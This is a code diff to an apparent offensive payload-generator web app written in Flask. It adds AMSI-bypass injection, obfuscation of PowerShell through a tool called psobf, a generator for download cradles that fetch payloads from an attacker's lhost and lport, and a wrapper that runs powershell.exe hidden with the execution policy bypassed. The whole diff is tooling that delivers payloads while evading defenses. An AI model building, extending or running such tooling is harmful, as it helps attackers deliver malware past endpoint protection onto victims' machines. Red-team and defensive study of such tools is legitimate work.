@@ -14,7 +14,7 @@ import tempfile
 import subprocess
 import random
 from pathlib import Path
-from typing import Dict, Any, Optional
+from typing import Dict, Any, Optional, Tuple
 from datetime import datetime
 
 from flask import Flask, render_template, jsonify, request, send_from_directory
@@ -44,40 +44,46 @@ config = None
 recipe_loader = None
 recipes = []
 history_manager = None
+ps_obfuscation_methods = []
+ps_features = []
 
 
 def load_amsi_bypasses():
-    """Load AMSI bypass methods from templates/amsi_bypasses directory
+    """Load AMSI bypass methods from ps-features.yaml
     
     Returns:
         Dict mapping bypass names to their code content
     """
     bypasses = {}
-    amsi_dir = config.templates_dir / 'amsi_bypasses'
     
-    if not amsi_dir.exists():
-        return bypasses
-    
-    for bypass_file in amsi_dir.glob('*.ps1'):
-        # Convert filename to display name (remove extension, replace _ with space)
-        name = bypass_file.stem.replace('_', ' ')
+    try:
+        ps_features_path = config.ps_features_yaml
+        if not ps_features_path.exists():
+            print(f"Warning: ps-features.yaml not found at {ps_features_path}", file=sys.stderr)
+            return bypasses
         
-        try:
-            with open(bypass_file, 'r') as f:
-                code = f.read().strip()
-                bypasses[name] = code
-        except Exception as e:
-            print(f"Warning: Failed to load AMSI bypass {bypass_file}: {e}", file=sys.stderr)
+        import yaml
+        with open(ps_features_path, 'r') as f:
+            features = yaml.safe_load(f) or []
+        
+        # Filter for AMSI bypasses
+        for feature in features:
+            if feature.get('type') == 'amsi' and 'code' in feature:
+                name = feature.get('name', 'Unknown')
+                bypasses[name] = feature.get('code', '').strip()
+    except Exception as e:
+        print(f"Warning: Failed to load AMSI bypasses from ps-features.yaml: {e}", file=sys.stderr)
     
     return bypasses
 
 
-def inject_amsi_bypass_launch_instructions(launch_instructions: str, bypass_method: str) -> str:
+def inject_amsi_bypass_launch_instructions(launch_instructions: str, bypass_method: str, obf_method: str = '') -> str:
     """Inject AMSI bypass into launch instructions
     
     Args:
         launch_instructions: Markdown text containing PowerShell code blocks
         bypass_method: Name of the bypass method to use
+        obf_method: Optional name of obfuscation method to apply
         
     Returns:
         Modified launch instructions with AMSI bypass injected
@@ -85,17 +91,81 @@ def inject_amsi_bypass_launch_instructions(launch_instructions: str, bypass_meth
     if not launch_instructions:
         return launch_instructions
     
-    # Load bypass code
-    amsi_dir = config.templates_dir / 'amsi_bypasses'
-    bypass_file = amsi_dir / f"{bypass_method.replace(' ', '_')}.ps1"
+    # Load bypass code from ps-features
+    bypass_feature = None
+    for feature in ps_features:
+        if feature.get('name') == bypass_method and feature.get('type') == 'amsi':
+            bypass_feature = feature
+            break
     
-    if not bypass_file.exists():
+    if not bypass_feature or 'code' not in bypass_feature:
         return launch_instructions
     
     try:
-        with open(bypass_file, 'r') as f:
-            bypass_code = f.read().strip()
-    except:
+        bypass_code = bypass_feature.get('code', '').strip()
+        
+        # Apply obfuscation to bypass code if requested and allowed
+        if obf_method and not bypass_feature.get('no-obf', False):
+            obf_method_data = None
+            for method in ps_obfuscation_methods:
+                if method.get('name') == obf_method:
+                    obf_method_data = method
+                    break
+            
+            if obf_method_data:
+                # Apply obfuscation
+                with tempfile.NamedTemporaryFile(mode='w', suffix='.ps1', delete=False) as tmp_in:
+                    tmp_in.write(bypass_code)
+                    tmp_in_path = tmp_in.name
+                
+                tmp_out_path = tmp_in_path.replace('.ps1', '_obf.ps1')
+                
+                try:
+                    # Generate random values
+                    rand_hex_bytes = random.randint(8, 32)
+                    rand_hex_length = rand_hex_bytes * 2
+                    rand_hex = ''.join(random.choices('0123456789abcdef', k=rand_hex_length))
+                    rand_stringdict = random.randint(0, 100)
+                    rand_deadcode = random.randint(0, 100)
+                    rand_seed = random.randint(0, 10000)
+                    
+                    command = obf_method_data.get('command', '').format(
+                        temp=tmp_in_path,
+                        out=tmp_out_path,
+                        hex_key=rand_hex,
+                        string_dict=rand_stringdict,
+                        dead_code=rand_deadcode,
+                        seed=rand_seed
+                    )
+                    
+                    result = subprocess.run(
+                        command,
+                        shell=True,
+                        capture_output=True,
+                        text=True,
+                        timeout=120
+                    )
+                    
+                    if result.returncode == 0 and os.path.exists(tmp_out_path):
+                        with open(tmp_out_path, 'r') as f:
+                            bypass_code = f.read().strip()
+                    
+                    # Clean up
+                    try:
+                        os.unlink(tmp_in_path)
+                        if os.path.exists(tmp_out_path):
+                            os.unlink(tmp_out_path)
+                    except:
+                        pass
+                except Exception:
+                    # Clean up on error
+                    try:
+                        os.unlink(tmp_in_path)
+                        if os.path.exists(tmp_out_path):
+                            os.unlink(tmp_out_path)
+                    except:
+                        pass
+    except Exception:
         return launch_instructions
     
     # Check if bypass is a one-liner (no newlines)
@@ -163,17 +233,31 @@ def inject_amsi_bypass_launch_instructions(launch_instructions: str, bypass_meth
     return modified_instructions
 
 
-def obfuscate_powershell_in_launch_instructions(launch_instructions: str, level: str) -> tuple:
+def obfuscate_powershell_in_launch_instructions(launch_instructions: str, method_name: str) -> tuple:
     """Obfuscate PowerShell code blocks in launch instructions
     
     Args:
         launch_instructions: Markdown text containing PowerShell code blocks
-        level: Obfuscation level ('high', 'medium', 'low')
+        method_name: Name of obfuscation method from ps-obfuscation.yaml
         
     Returns:
         Tuple of (modified_instructions, commands_executed)
     """
     if not launch_instructions:
+        return launch_instructions, []
+    
+    # Find the obfuscation method
+    obf_method = None
+    for method in ps_obfuscation_methods:
+        if method.get('name') == method_name:
+            obf_method = method
+            break
+    
+    if not obf_method:
+        return launch_instructions, []
+    
+    command_template = obf_method.get('command', '')
+    if not command_template:
         return launch_instructions, []
     
     # Pattern to match PowerShell code blocks (```powershell or ```ps1)
@@ -192,79 +276,55 @@ def obfuscate_powershell_in_launch_instructions(launch_instructions: str, level:
         tmp_out_path = tmp_in_path.replace('.ps1', '_obf.ps1')
         
         try:
-            # Define obfuscation levels
-            levels = []
-            if level == 'high':
-                levels = ['high', 'medium', 'low']
-            elif level == 'medium':
-                levels = ['medium', 'low']
-            else:
-                levels = ['low']
+            # Generate random values
+            rand_hex_bytes = random.randint(8, 32)
+            rand_hex_length = rand_hex_bytes * 2
+            rand_hex = ''.join(random.choices('0123456789abcdef', k=rand_hex_length))
+            rand_stringdict = random.randint(0, 100)
+            rand_deadcode = random.randint(0, 100)
+            rand_seed = random.randint(0, 10000)
             
-            # Try each level with failover
-            for current_level in levels:
-                # Generate random values
-                rand_hex_bytes = random.randint(8, 32)
-                rand_hex_length = rand_hex_bytes * 2
-                rand_hex = ''.join(random.choices('0123456789abcdef', k=rand_hex_length))
-                rand_stringdict = random.randint(0, 100)
-                rand_deadcode = random.randint(0, 100)
-                rand_seed = random.randint(0 if current_level != 'high' else 1, 10000)
-                
-                # Build command based on level
-                if current_level == 'high':
-                    command = (
-                        f'psobf -i "{tmp_in_path}" -o "{tmp_out_path}" -q -level 5 '
-                        f'-pipeline "iden,strenc,stringdict,numenc,fmt,cf,dead,frag" '
-                        f'-iden obf -strenc xor -strkey {rand_hex} '
-                        f'-stringdict {rand_stringdict} -numenc -fmt jitter -cf-opaque '
-                        f'-deadcode {rand_deadcode} -frag profile=medium -seed {rand_seed}'
-                    )
-                elif current_level == 'medium':
-                    command = (
-                        f'psobf -i "{tmp_in_path}" -o "{tmp_out_path}" -q -level 3 '
-                        f'-pipeline "iden,strenc,stringdict,numenc,fmt,cf,dead,frag" '
-                        f'-strenc xor -strkey {rand_hex} -stringdict {rand_stringdict} '
-                        f'-deadcode {rand_deadcode} -fmt jitter -frag profile=medium '
-                        f'-seed {rand_seed}'
-                    )
-                else:
-                    command = (
-                        f'psobf -i "{tmp_in_path}" -o "{tmp_out_path}" '
-                        f'-level 2 -seed {rand_seed}'
-                    )
-                
-                # Execute obfuscation
-                result = subprocess.run(
-                    command,
-                    shell=True,
-                    capture_output=True,
-                    text=True,
-                    timeout=120
-                )
-                
-                # Check if successful
-                if result.returncode == 0 and os.path.exists(tmp_out_path):
-                    with open(tmp_out_path, 'r') as f:
-                        obfuscated_code = f.read()
-                    
-                    # Ensure code ends with newline before closing backticks
-                    if not obfuscated_code.endswith('\n'):
-                        obfuscated_code += '\n'
-                    
-                    # Clean up temp files
-                    try:
-                        os.unlink(tmp_in_path)
-                        os.unlink(tmp_out_path)
-                    except:
-                        pass
-                    
-                    # Store the successful command
-                    commands_executed.append(command)
-                    
-                    return f'```powershell\n{obfuscated_code}```'
+            # Format command
+            command = command_template.format(
+                temp=tmp_in_path,
+                out=tmp_out_path,
+                hex_key=rand_hex,
+                string_dict=rand_stringdict,
+                dead_code=rand_deadcode,
+                seed=rand_seed
+            )
             
-            # All levels failed, return original
+            # Execute obfuscation
+            result = subprocess.run(
+                command,
+                shell=True,
+                capture_output=True,
+                text=True,
+                timeout=120
+            )
+            
+            # Check if successful
+            if result.returncode == 0 and os.path.exists(tmp_out_path):
+                with open(tmp_out_path, 'r') as f:
+                    obfuscated_code = f.read()
+                
+                # Ensure code ends with newline before closing backticks
+                if not obfuscated_code.endswith('\n'):
+                    obfuscated_code += '\n'
+                
+                # Clean up temp files
+                try:
+                    os.unlink(tmp_in_path)
+                    os.unlink(tmp_out_path)
+                except:
+                    pass
+                
+                # Store the successful command
+                commands_executed.append(command)
+                
+                return f'```powershell\n{obfuscated_code}```'
+            
+            # Failed, return original
             try:
                 os.unlink(tmp_in_path)
                 if os.path.exists(tmp_out_path):
@@ -288,6 +348,111 @@ def obfuscate_powershell_in_launch_instructions(launch_instructions: str, level:
     # Replace all PowerShell code blocks
     modified_instructions = re.sub(pattern, obfuscate_code_block, launch_instructions, flags=re.DOTALL)
     return modified_instructions, commands_executed
+
+
+def generate_cradle(cradle_name: str, lhost: str, lport: int, output_file: str, obf_method: str = '') -> Tuple[str, str]:
+    """Generate a download cradle from ps-features.yaml
+    
+    Args:
+        cradle_name: Name of cradle from ps-features.yaml
+        lhost: Listening host (IP or domain)
+        lport: Listening port
+        output_file: Output filename for the payload
+        obf_method: Optional obfuscation method to apply
+        
+    Returns:
+        Tuple of (cradle_code, command_used)
+    """
+    # Find the cradle
+    cradle_feature = None
+    for feature in ps_features:
+        if feature.get('name') == cradle_name and feature.get('type', '').startswith('cradle-'):
+            cradle_feature = feature
+            break
+    
+    if not cradle_feature or 'code' not in cradle_feature:
+        return '', ''
+    
+    # Build base URL based on port (without output_file)
+    if lport == 443:
+        url = f'https://{lhost}'
+    elif lport == 80:
+        url = f'http://{lhost}'
+    else:
+        url = f'http://{lhost}:{lport}'
+    
+    # Generate cradle code
+    cradle_code = cradle_feature.get('code', '').strip()
+    cradle_code = cradle_code.replace('{url}', url)
+    cradle_code = cradle_code.replace('{output_file}', output_file)
+    
+    command_used = ''
+    
+    # Apply obfuscation if requested and allowed
+    if obf_method and not cradle_feature.get('no-obf', False):
+        obf_method_data = None
+        for method in ps_obfuscation_methods:
+            if method.get('name') == obf_method:
+                obf_method_data = method
+                break
+        
+        if obf_method_data:
+            # Apply obfuscation
+            with tempfile.NamedTemporaryFile(mode='w', suffix='.ps1', delete=False) as tmp_in:
+                tmp_in.write(cradle_code)
+                tmp_in_path = tmp_in.name
+            
+            tmp_out_path = tmp_in_path.replace('.ps1', '_obf.ps1')
+            
+            try:
+                # Generate random values
+                rand_hex_bytes = random.randint(8, 32)
+                rand_hex_length = rand_hex_bytes * 2
+                rand_hex = ''.join(random.choices('0123456789abcdef', k=rand_hex_length))
+                rand_stringdict = random.randint(0, 100)
+                rand_deadcode = random.randint(0, 100)
+                rand_seed = random.randint(0, 10000)
+                
+                command = obf_method_data.get('command', '').format(
+                    temp=tmp_in_path,
+                    out=tmp_out_path,
+                    hex_key=rand_hex,
+                    string_dict=rand_stringdict,
+                    dead_code=rand_deadcode,
+                    seed=rand_seed
+                )
+                
+                command_used = command
+                
+                result = subprocess.run(
+                    command,
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    timeout=120
+                )
+                
+                if result.returncode == 0 and os.path.exists(tmp_out_path):
+                    with open(tmp_out_path, 'r') as f:
+                        cradle_code = f.read().strip()
+                
+                # Clean up
+                try:
+                    os.unlink(tmp_in_path)
+                    if os.path.exists(tmp_out_path):
+                        os.unlink(tmp_out_path)
+                except:
+                    pass
+            except Exception:
+                # Clean up on error
+                try:
+                    os.unlink(tmp_in_path)
+                    if os.path.exists(tmp_out_path):
+                        os.unlink(tmp_out_path)
+                except:
+                    pass
+    
+    return cradle_code, command_used
 
 
 def obfuscate_csharp_identifiers(code: str) -> tuple:
@@ -521,7 +686,7 @@ def obfuscate_csharp_identifiers(code: str) -> tuple:
 
 def init_app():
     """Initialize the Flask application with paygen configuration"""
-    global config, recipe_loader, recipes, history_manager
+    global config, recipe_loader, recipes, history_manager, ps_obfuscation_methods, ps_features
     
     # Load configuration
     try:
@@ -548,6 +713,36 @@ def init_app():
     except Exception as e:
         print(f"✗ Failed to initialize history: {e}", file=sys.stderr)
         history_manager = None
+    
+    # Load PowerShell obfuscation methods
+    try:
+        import yaml
+        ps_obf_path = config.ps_obfuscation_yaml
+        if ps_obf_path.exists():
+            with open(ps_obf_path, 'r') as f:
+                ps_obfuscation_methods = yaml.safe_load(f) or []
+            print(f"✓ Loaded {len(ps_obfuscation_methods)} PS obfuscation methods")
+        else:
+            print(f"✗ ps-obfuscation.yaml not found at {ps_obf_path}", file=sys.stderr)
+            ps_obfuscation_methods = []
+    except Exception as e:
+        print(f"✗ Failed to load ps-obfuscation.yaml: {e}", file=sys.stderr)
+        ps_obfuscation_methods = []
+    
+    # Load PowerShell features (AMSI, cradles)
+    try:
+        import yaml
+        ps_feat_path = config.ps_features_yaml
+        if ps_feat_path.exists():
+            with open(ps_feat_path, 'r') as f:
+                ps_features = yaml.safe_load(f) or []
+            print(f"✓ Loaded {len(ps_features)} PS features (AMSI/cradles)")
+        else:
+            print(f"✗ ps-features.yaml not found at {ps_feat_path}", file=sys.stderr)
+            ps_features = []
+    except Exception as e:
+        print(f"✗ Failed to load ps-features.yaml: {e}", file=sys.stderr)
+        ps_features = []
 
 
 @app.route('/')
@@ -559,10 +754,51 @@ def index():
 
 @app.route('/api/amsi-bypasses')
 def get_amsi_bypasses():
-    """Get available AMSI bypass methods"""
-    bypasses = load_amsi_bypasses()
-    # Return as list of names for dropdown
-    return jsonify({'bypasses': sorted(bypasses.keys())})
+    """Get available AMSI bypass methods from ps-features.yaml"""
+    amsi_methods = [f for f in ps_features if f.get('type') == 'amsi']
+    
+    # Return list with names and no-obf flags
+    bypasses = []
+    for method in amsi_methods:
+        bypasses.append({
+            'name': method.get('name', 'Unknown'),
+            'no_obf': method.get('no-obf', False)
+        })
+    
+    return jsonify({'bypasses': bypasses})
+
+
+@app.route('/api/ps-obfuscation-methods')
+def get_ps_obfuscation_methods():
+    """Get available PowerShell obfuscation methods"""
+    methods = [{'name': m.get('name')} for m in ps_obfuscation_methods]
+    return jsonify({'methods': methods})
+
+
+@app.route('/api/ps-cradles')
+def get_ps_cradles():
+    """Get available PowerShell cradles grouped by type"""
+    cradles = {'ps1': [], 'exe': [], 'dll': []}
+    
+    for feature in ps_features:
+        feature_type = feature.get('type', '')
+        if feature_type == 'cradle-ps1':
+            cradles['ps1'].append({
+                'name': feature.get('name'),
+                'no_obf': feature.get('no-obf', False)
+            })
+        elif feature_type == 'cradle-exe':
+            cradles['exe'].append({
+                'name': feature.get('name'),
+                'no_obf': feature.get('no-obf', False)
+            })
+        elif feature_type == 'cradle-dll':
+            cradles['dll'].append({
+                'name': feature.get('name'),
+                'no_obf': feature.get('no-obf', False)
+            })
+    
+    return jsonify({'cradles': cradles})
 
 
 @app.route('/api/recipes')
@@ -890,15 +1126,65 @@ def generate_payload():
                     # Process launch instructions
                     final_launch_instructions = recipe_obj.launch_instructions
                     
+                    # Step 0: Generate cradle if requested (FIRST)
+                    cradle_code = ''
+                    if build_options.get('ps_cradle') or build_options.get('cs_cradle'):
+                        cradle_method = build_options.get('ps_cradle_method') or build_options.get('cs_cradle_method', '')
+                        cradle_obf_method = build_options.get('ps_cradle_obf_method') or build_options.get('cs_cradle_obf_method', '')
+                        lhost = build_options.get('cradle_lhost', '')
+                        lport = build_options.get('cradle_lport', 80)
+                        
+                        if cradle_method and lhost:
+                            # Get output filename from the build
+                            import os
+                            output_filename = os.path.basename(output_file)
+                            
+                            # Generate cradle
+                            cradle_step_name = f'Generating download cradle ({cradle_method})'
+                            if cradle_obf_method:
+                                cradle_step_name += f' with obfuscation ({cradle_obf_method})'
+                            
+                            cradle_step = {
+                                'name': cradle_step_name,
+                                'type': 'cradle',
+                                'status': 'running',
+                                'output': f"Generating cradle for {output_filename}",
+                                'error': ''
+                            }
+                            build_sessions[session_id]['steps'].append(cradle_step)
+                            
+                            cradle_code, command_used = generate_cradle(
+                                cradle_method,
+                                lhost,
+                                lport,
+                                output_filename,
+                                cradle_obf_method
+                            )
+                            
+                            if cradle_code:
+                                cradle_step['status'] = 'success'
+                                cradle_output = f"Cradle generated successfully"
+                                if command_used:
+                                    cradle_output += f"\n\nCommand: {command_used}"
+                                cradle_step['output'] = cradle_output
+                            else:
+                                cradle_step['status'] = 'failed'
+                                cradle_step['error'] = 'Failed to generate cradle'
+                    
                     # Step 1: Insert AMSI bypass if requested (BEFORE obfuscation)
                     if (build_options.get('amsi_bypass_launch', False) and 
                         recipe_obj.launch_instructions):
                         amsi_method = build_options.get('amsi_bypass_launch_method', '')
+                        amsi_obf_method = build_options.get('amsi_bypass_launch_obf_method', '')
                         
                         if amsi_method:
                             # Add AMSI bypass step
+                            amsi_step_name = f'Inserting AMSI bypass in launch instructions ({amsi_method})'
+                            if amsi_obf_method:
+                                amsi_step_name += f' with obfuscation ({amsi_obf_method})'
+                            
                             amsi_step = {
-                                'name': f'Inserting AMSI bypass in launch instructions ({amsi_method})',
+                                'name': amsi_step_name,
                                 'type': 'amsi_bypass',
                                 'status': 'success',
                                 'output': f"AMSI bypass '{amsi_method}' injected into launch instructions",
@@ -909,17 +1195,18 @@ def generate_payload():
                             # Inject bypass
                             final_launch_instructions = inject_amsi_bypass_launch_instructions(
                                 final_launch_instructions,
-                                amsi_method
+                                amsi_method,
+                                amsi_obf_method
                             )
                     
                     # Step 2: Obfuscate PowerShell if requested
                     if (build_options.get('obfuscate_launch_ps', False) and 
                         final_launch_instructions):
-                        obf_level = build_options.get('obfuscate_launch_ps_level', 'low')
+                        obf_method = build_options.get('obfuscate_launch_ps_level', '')
                         
                         # Add obfuscation step to build session
                         obf_step = {
-                            'name': f'Obfuscating launch instructions ({obf_level.upper()} level)',
+                            'name': f'Obfuscating launch instructions ({obf_method})',
                             'type': 'obfuscation',
                             'status': 'running',
                             'output': f'Obfuscating PowerShell code blocks in launch instructions',
@@ -929,14 +1216,22 @@ def generate_payload():
                         
                         # Perform obfuscation
                         final_launch_instructions, commands = obfuscate_powershell_in_launch_instructions(
-                            recipe_obj.launch_instructions, 
-                            obf_level
+                            final_launch_instructions, 
+                            obf_method
                         )
                         
                         # Update step status with commands
                         commands_output = '\n\n'.join([f'Command: {cmd}' for cmd in commands]) if commands else 'No PowerShell code blocks found'
                         obf_step['status'] = 'success'
-                        obf_step['output'] = f'{commands_output}\n\nSuccessfully obfuscated PowerShell code blocks ({obf_level.upper()} level)'
+                        obf_step['output'] = f'{commands_output}\n\nSuccessfully obfuscated PowerShell code blocks ({obf_method})'
+                    
+                    # Step 3: Prepend cradle to launch instructions if generated
+                    if cradle_code:
+                        cradle_section = f"# Cradle\n\n```powershell\n{cradle_code}\n```\n\n"
+                        if final_launch_instructions:
+                            final_launch_instructions = cradle_section + final_launch_instructions
+                        else:
+                            final_launch_instructions = cradle_section
                     
                     build_sessions[session_id]['launch_instructions'] = final_launch_instructions
                     
@@ -1072,13 +1367,43 @@ def delete_history_entry(index):
     return jsonify({'error': 'History manager not available'}), 500
 
 
+def _apply_powershell_wrapper(ps_command):
+    """
+    Apply PowerShell CMD launcher wrapper with proper escaping for cmd.exe
+    
+    Args:
+        ps_command: The PowerShell command to wrap
+        
+    Returns:
+        Wrapped command ready for execution from cmd.exe
+    """
+    # Escape quotes for cmd.exe context
+    # In cmd.exe, we need to escape double quotes with backslash when inside a quoted string
+    # and also escape any existing backslashes that precede quotes
+    
+    # First, escape existing backslashes that are followed by quotes
+    escaped = ps_command.replace('\\', '\\\\')
+    
+    # Then escape double quotes
+    escaped = escaped.replace('"', '\\"')
+    
+    # Single quotes don't need escaping in PowerShell strings when wrapped in double quotes
+    # But we need to handle them if they're part of PowerShell string literals
+    
+    # Build the wrapper command
+    wrapper = f'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "{escaped}"'
+    
+    return wrapper
+
+
 @app.route('/api/obfuscate-ps', methods=['POST'])
 def obfuscate_powershell():
-    """Obfuscate PowerShell command
+    """Obfuscate PowerShell command using YAML-based methods
     
     Request JSON:
         command: PowerShell command to obfuscate
-        level: Obfuscation level ('high', 'medium', 'low')
+        method: Obfuscation method name from ps-obfuscation.yaml
+        add_wrapper: Whether to add PowerShell CMD launcher wrapper
         
     Returns:
         JSON with obfuscated PowerShell code
@@ -1090,13 +1415,33 @@ def obfuscate_powershell():
             return jsonify({'error': 'No data provided'}), 400
         
         ps_command = data.get('command', '').strip()
-        level = data.get('level', 'medium').lower()
+        method_name = data.get('method', '').strip()
+        add_wrapper = data.get('add_wrapper', False)
         
         if not ps_command:
             return jsonify({'error': 'PowerShell command is required'}), 400
         
-        if level not in ['high', 'medium', 'low']:
-            return jsonify({'error': 'Invalid obfuscation level'}), 400
+        # Handle None/empty method - return command as-is (with optional wrapper)
+        if not method_name:
+            result_code = ps_command
+            if add_wrapper:
+                result_code = _apply_powershell_wrapper(result_code)
+            return jsonify({
+                'success': True,
+                'obfuscated': result_code,
+                'method': 'None',
+                'command': ''
+            })
+        
+        # Find the obfuscation method
+        obf_method = None
+        for method in ps_obfuscation_methods:
+            if method.get('name') == method_name:
+                obf_method = method
+                break
+        
+        if not obf_method:
+            return jsonify({'error': f'Obfuscation method "{method_name}" not found'}), 400
         
         # Create temporary files for obfuscation
         with tempfile.NamedTemporaryFile(mode='w', suffix='.ps1', delete=False) as tmp_in:
@@ -1106,85 +1451,66 @@ def obfuscate_powershell():
         tmp_out_path = tmp_in_path.replace('.ps1', '_obf.ps1')
         
         try:
-            # Define obfuscation levels
-            levels = []
-            if level == 'high':
-                levels = ['high', 'medium', 'low']
-            elif level == 'medium':
-                levels = ['medium', 'low']
-            else:
-                levels = ['low']
+            # Generate random values for template variables
+            rand_hex_bytes = random.randint(8, 32)
+            rand_hex_length = rand_hex_bytes * 2
+            rand_hex = ''.join(random.choices('0123456789abcdef', k=rand_hex_length))
+            rand_stringdict = random.randint(0, 100)
+            rand_deadcode = random.randint(0, 100)
+            rand_seed = random.randint(0, 10000)
             
-            # Try each level with failover
-            for current_level in levels:
-                # Generate random values
-                rand_hex_bytes = random.randint(8, 32)
-                rand_hex_length = rand_hex_bytes * 2
-                rand_hex = ''.join(random.choices('0123456789abcdef', k=rand_hex_length))
-                rand_stringdict = random.randint(0, 100)
-                rand_deadcode = random.randint(0, 100)
-                rand_seed = random.randint(0 if current_level != 'high' else 1, 10000)
-                
-                # Build command based on level
-                if current_level == 'high':
-                    command = (
-                        f'psobf -i "{tmp_in_path}" -o "{tmp_out_path}" -q -level 5 '
-                        f'-pipeline "iden,strenc,stringdict,numenc,fmt,cf,dead,frag" '
-                        f'-iden obf -strenc xor -strkey {rand_hex} '
-                        f'-stringdict {rand_stringdict} -numenc -fmt jitter -cf-opaque '
-                        f'-deadcode {rand_deadcode} -frag profile=medium -seed {rand_seed}'
-                    )
-                elif current_level == 'medium':
-                    command = (
-                        f'psobf -i "{tmp_in_path}" -o "{tmp_out_path}" -q -level 3 '
-                        f'-pipeline "iden,strenc,stringdict,numenc,fmt,cf,dead,frag" '
-                        f'-strenc xor -strkey {rand_hex} -stringdict {rand_stringdict} '
-                        f'-deadcode {rand_deadcode} -fmt jitter -frag profile=medium '
-                        f'-seed {rand_seed}'
-                    )
-                else:
-                    command = (
-                        f'psobf -i "{tmp_in_path}" -o "{tmp_out_path}" '
-                        f'-level 2 -seed {rand_seed}'
-                    )
-                
-                # Execute obfuscation
-                result = subprocess.run(
-                    command,
-                    shell=True,
-                    capture_output=True,
-                    text=True,
-                    timeout=120
-                )
-                
-                # Check if successful
-                if result.returncode == 0 and os.path.exists(tmp_out_path):
-                    with open(tmp_out_path, 'r') as f:
-                        obfuscated_code = f.read().strip()
-                    
-                    # Clean up temp files
-                    try:
-                        os.unlink(tmp_in_path)
-                        os.unlink(tmp_out_path)
-                    except:
-                        pass
-                    
-                    return jsonify({
-                        'success': True,
-                        'obfuscated': obfuscated_code,
-                        'level': current_level
-                    })
+            # Build command from template
+            command_template = obf_method.get('command', '')
+            command = command_template.replace('{temp}', tmp_in_path)
+            command = command.replace('{out}', tmp_out_path)
+            command = command.replace('{hex_key}', rand_hex)
+            command = command.replace('{string_dict}', str(rand_stringdict))
+            command = command.replace('{dead_code}', str(rand_deadcode))
+            command = command.replace('{seed}', str(rand_seed))
             
-            # All levels failed
-            try:
-                os.unlink(tmp_in_path)
-                if os.path.exists(tmp_out_path):
+            # Execute obfuscation
+            result = subprocess.run(
+                command,
+                shell=True,
+                capture_output=True,
+                text=True,
+                timeout=120
+            )
+            
+            # Check if successful
+            if result.returncode == 0 and os.path.exists(tmp_out_path):
+                with open(tmp_out_path, 'r') as f:
+                    obfuscated_code = f.read().strip()
+                
+                # Apply wrapper if requested
+                if add_wrapper:
+                    obfuscated_code = _apply_powershell_wrapper(obfuscated_code)
+                
+                # Clean up temp files
+                try:
+                    os.unlink(tmp_in_path)
                     os.unlink(tmp_out_path)
-            except:
-                pass
-            
-            return jsonify({'error': 'All obfuscation levels failed. Please check your PowerShell syntax.'}), 500
-            
+                except:
+                    pass
+                
+                return jsonify({
+                    'success': True,
+                    'obfuscated': obfuscated_code,
+                    'method': method_name,
+                    'command': command
+                })
+            else:
+                # Obfuscation failed
+                error_msg = result.stderr if result.stderr else 'Unknown error'
+                try:
+                    os.unlink(tmp_in_path)
+                    if os.path.exists(tmp_out_path):
+                        os.unlink(tmp_out_path)
+                except:
+                    pass
+                
+                return jsonify({'error': f'Obfuscation failed: {error_msg}'}), 500
+                
         except subprocess.TimeoutExpired:
             # Clean up temp files on timeout
             try:
@@ -1194,7 +1520,7 @@ def obfuscate_powershell():
             except:
                 pass
             
-            return jsonify({'error': 'Obfuscation timed out. Try a simpler command or lower obfuscation level.'}), 500
+            return jsonify({'error': 'Obfuscation timed out. Try a simpler command.'}), 500
             
         except Exception as e:
             # Clean up temp files on error
